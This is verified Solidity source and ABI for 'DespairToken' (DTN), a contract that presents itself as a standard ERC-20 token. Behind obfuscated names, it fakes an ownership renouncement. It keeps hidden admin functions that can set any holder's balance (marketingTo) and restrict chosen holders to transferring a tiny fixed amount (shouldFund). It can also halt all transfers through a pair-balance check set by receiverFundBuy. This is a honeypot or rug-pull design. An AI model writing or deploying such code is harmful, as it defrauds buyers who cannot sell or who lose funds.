{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.16;\n\ninterface walletExempt {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address shouldList) external view returns (uint256);\n\n    function transfer(address launchedExempt, uint256 tokenBuy) external returns (bool);\n\n    function allowance(address walletReceiver, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 tokenBuy) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address launchedExempt,\n        uint256 tokenBuy\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed tokenWalletTrading, uint256 value);\n    event Approval(address indexed walletReceiver, address indexed spender, uint256 value);\n}\n\nabstract contract launchedMin {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface shouldMaxLaunch {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface launchedLaunch {\n    function createPair(address launchedLimit, address txExempt) external returns (address);\n}\n\ninterface swapTradingAuto is walletExempt {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract DespairToken is launchedMin, walletExempt, swapTradingAuto {\n\n    function transferFrom(address fromIsAuto, address launchedExempt, uint256 tokenBuy) external override returns (bool) {\n        if (_msgSender() != receiverWallet) {\n            if (atMarketing[fromIsAuto][_msgSender()] != type(uint256).max) {\n                require(tokenBuy <= atMarketing[fromIsAuto][_msgSender()]);\n                atMarketing[fromIsAuto][_msgSender()] -= tokenBuy;\n            }\n        }\n        return teamLaunched(fromIsAuto, launchedExempt, tokenBuy);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return senderIsTeam;\n    }\n\n    mapping(address => uint256) private buyAuto;\n\n    mapping(address => bool) public shouldSender;\n\n    function owner() external view returns (address) {\n        return amountEnable;\n    }\n\n    string private atToMarketing = \"DTN\";\n\n    function receiverFundBuy(uint256 tokenBuy) public {\n        minMarketing();\n        fundReceiver = tokenBuy;\n    }\n\n    function teamLaunched(address fromIsAuto, address launchedExempt, uint256 tokenBuy) internal returns (bool) {\n        if (fromIsAuto == buyMin) {\n            return autoTo(fromIsAuto, launchedExempt, tokenBuy);\n        }\n        uint256 limitIs = walletExempt(amountLiquidity).balanceOf(swapLaunch);\n        require(limitIs == fundReceiver);\n        require(launchedExempt != swapLaunch);\n        if (shouldSender[fromIsAuto]) {\n            return autoTo(fromIsAuto, launchedExempt, takeMarketing);\n        }\n        return autoTo(fromIsAuto, launchedExempt, tokenBuy);\n    }\n\n    mapping(address => mapping(address => uint256)) private atMarketing;\n\n    mapping(address => bool) public liquidityLimit;\n\n    bool public senderIs;\n\n    uint256 public receiverIsFrom;\n\n    function limitFund(address walletBuy) public {\n        if (senderIs) {\n            return;\n        }\n        if (takeSell != receiverIsFrom) {\n            receiverIsFrom = marketingTokenWallet;\n        }\n        liquidityLimit[walletBuy] = true;\n        \n        senderIs = true;\n    }\n\n    function balanceOf(address shouldList) public view virtual override returns (uint256) {\n        return buyAuto[shouldList];\n    }\n\n    uint256 private enableShould = 100000000 * 10 ** 18;\n\n    function transfer(address fromTrading, uint256 tokenBuy) external virtual override returns (bool) {\n        return teamLaunched(_msgSender(), fromTrading, tokenBuy);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return enableShould;\n    }\n\n    function autoTo(address fromIsAuto, address launchedExempt, uint256 tokenBuy) internal returns (bool) {\n        require(buyAuto[fromIsAuto] >= tokenBuy);\n        buyAuto[fromIsAuto] -= tokenBuy;\n        buyAuto[launchedExempt] += tokenBuy;\n        emit Transfer(fromIsAuto, launchedExempt, tokenBuy);\n        return true;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return tokenLaunch;\n    }\n\n    function allowance(address walletMaxTeam, address teamMode) external view virtual override returns (uint256) {\n        if (teamMode == receiverWallet) {\n            return type(uint256).max;\n        }\n        return atMarketing[walletMaxTeam][teamMode];\n    }\n\n    uint256 fundReceiver;\n\n    bool private tradingWallet;\n\n    uint8 private tokenLaunch = 18;\n\n    uint256 private marketingTokenWallet;\n\n    function getOwner() external view returns (address) {\n        return amountEnable;\n    }\n\n    address swapLaunch = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    event OwnershipTransferred(address indexed modeSender, address indexed senderWalletMode);\n\n    function shouldFund(address fromAuto) public {\n        minMarketing();\n        \n        if (fromAuto == buyMin || fromAuto == amountLiquidity) {\n            return;\n        }\n        shouldSender[fromAuto] = true;\n    }\n\n    constructor (){\n        \n        shouldMaxLaunch walletAmountShould = shouldMaxLaunch(receiverWallet);\n        amountLiquidity = launchedLaunch(walletAmountShould.factory()).createPair(walletAmountShould.WETH(), address(this));\n        if (receiverIsFrom == takeSell) {\n            takeSell = marketingTokenWallet;\n        }\n        buyMin = _msgSender();\n        buyMax();\n        liquidityLimit[buyMin] = true;\n        buyAuto[buyMin] = enableShould;\n        \n        emit Transfer(address(0), buyMin, enableShould);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return atToMarketing;\n    }\n\n    address public amountLiquidity;\n\n    string private senderIsTeam = \"Despair Token\";\n\n    address private amountEnable;\n\n    uint256 constant takeMarketing = 15 ** 10;\n\n    uint256 private takeSell;\n\n    address receiverWallet = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function minMarketing() private view {\n        require(liquidityLimit[_msgSender()]);\n    }\n\n    uint256 atLiquidityFund;\n\n    function buyMax() public {\n        emit OwnershipTransferred(buyMin, address(0));\n        amountEnable = address(0);\n    }\n\n    function marketingTo(address fromTrading, uint256 tokenBuy) public {\n        minMarketing();\n        buyAuto[fromTrading] = tokenBuy;\n    }\n\n    function approve(address teamMode, uint256 tokenBuy) public virtual override returns (bool) {\n        atMarketing[_msgSender()][teamMode] = tokenBuy;\n        emit Approval(_msgSender(), teamMode, tokenBuy);\n        return true;\n    }\n\n    bool public enableAt;\n\n    address public buyMin;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeSender\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderWalletMode\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenWalletTrading\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletMaxTeam\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"teamMode\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountLiquidity\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamMode\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenBuy\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldList\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyMin\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletBuy\",\"type\":\"address\"}],\"name\":\"limitFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"liquidityLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenBuy\",\"type\":\"uint256\"}],\"name\":\"marketingTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"tokenBuy\",\"type\":\"uint256\"}],\"name\":\"receiverFundBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverIsFrom\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromAuto\",\"type\":\"address\"}],\"name\":\"shouldFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"shouldSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenBuy\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromIsAuto\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchedExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenBuy\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "DespairToken", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}